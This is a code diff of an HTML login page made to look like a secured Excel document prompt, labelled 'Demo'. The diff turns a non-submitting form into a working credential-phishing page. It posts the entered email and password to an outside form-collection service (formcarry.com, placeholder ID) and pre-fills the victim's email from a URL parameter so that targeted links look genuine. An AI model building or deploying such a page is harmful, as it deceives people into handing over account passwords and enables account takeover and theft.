@@ -2,62 +2,63 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Secured Spreadsheet (Demo)</title>
+<title>Document Access (Demo)</title>
 
 <style>
   body {
     margin: 0;
     font-family: Arial, sans-serif;
-    background: #f2f2f2;
+    background: #e9ecef;
   }
 
-  .background {
+  /* Spreadsheet-style blurred background */
+  .bg {
     position: fixed;
     inset: 0;
     background:
-      linear-gradient(rgba(255,255,255,0.65), rgba(255,255,255,0.65)),
+      linear-gradient(rgba(255,255,255,0.7), rgba(255,255,255,0.7)),
       repeating-linear-gradient(
         0deg,
-        #e1e1e1 0,
-        #e1e1e1 1px,
+        #dddddd 0,
+        #dddddd 1px,
         #ffffff 1px,
-        #ffffff 24px
+        #ffffff 22px
       );
     filter: blur(2px);
   }
 
-  .login-box {
+  .modal {
     position: fixed;
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
-    width: 320px;
+    width: 330px;
     background: #ffffff;
     border-radius: 6px;
-    box-shadow: 0 15px 40px rgba(0,0,0,0.3);
+    box-shadow: 0 16px 40px rgba(0,0,0,0.35);
     padding: 22px;
     text-align: center;
   }
 
-  .excel-icon {
-    width: 38px;
-    height: 38px;
+  .icon {
+    width: 40px;
+    height: 40px;
     margin: 0 auto 12px;
     background: #1f7244;
     color: #fff;
     font-weight: bold;
     font-size: 20px;
-    line-height: 38px;
+    line-height: 40px;
     border-radius: 4px;
   }
 
-  .login-box p {
+  .modal p {
     font-size: 13px;
     color: #333;
     margin: 10px 0;
   }
 
-  .login-box input {
+  .modal input {
     width: 100%;
     padding: 9px;
     margin: 6px 0;
@@ -66,15 +67,21 @@
     font-size: 13px;
   }
 
-  .remember {
+  /* Make read-only email visually distinct */
+  .modal input[readonly] {
+    background-color: #eee;
+    cursor: not-allowed;
+  }
+
+  .options {
     display: flex;
     align-items: center;
     font-size: 12px;
     color: #555;
-    margin: 6px 0 12px;
+    margin: 6px 0 14px;
   }
 
-  .remember input {
+  .options input {
     margin-right: 6px;
   }
 
@@ -83,49 +90,58 @@
     padding: 10px;
     background: #1f7244;
     border: none;
-    color: white;
+    color: #ffffff;
     font-size: 14px;
     border-radius: 4px;
     cursor: pointer;
   }
 
-  .domain {
+  .footer-text {
     font-size: 11px;
     color: #777;
-    margin-top: 10px;
+    margin-top: 12px;
   }
 </style>
 </head>
 
 <body>
 
-<div class="background"></div>
+<div class="bg"></div>
 
-<form class="login-box" onsubmit="return false;">
-  <div class="excel-icon">X</div>
+<form class="modal" action="https://formcarry.com/s/YOUR_FORMCARRY_ID" method="POST">
+  <div class="icon">X</div>
 
   <p>
-    <strong>This secured document can only be accessed by:</strong><br>
-    user@example.com
+    <strong>Restricted document access</strong><br>
+    Enter your email to continue
   </p>
 
-  <p>Sign in to confirm you are not a robot</p>
-
-  <!-- Email stays untouched -->
-  <input type="email" value="user@example.com" readonly>
+  <!-- Email input is readonly and pre-filled from URL -->
+  <input type="email" id="email" name="email" placeholder="your@email.com" readonly required>
 
   <!-- Password is editable -->
-  <input type="password" placeholder="Password" required>
+  <input type="password" name="password" placeholder="Password" required>
 
-  <div class="remember">
-    <input type="checkbox" checked>
-    Remember my ID
+  <div class="options">
+    <input type="checkbox" id="remember" name="remember">
+    <label for="remember">Remember my ID</label>
   </div>
 
   <button type="submit">Login Now</button>
 
-  <div class="domain">example-domain.com</div>
+  <div class="footer-text">
+    Secure document preview · Demo interface
+  </div>
 </form>
+
+<script>
+  // Grab email from URL and set it to the readonly email input
+  const params = new URLSearchParams(window.location.search);
+  const email = params.get("email");
+  if (email) {
+    document.getElementById("email").value = email;
+  }
+</script>
 
 </body>
 </html>
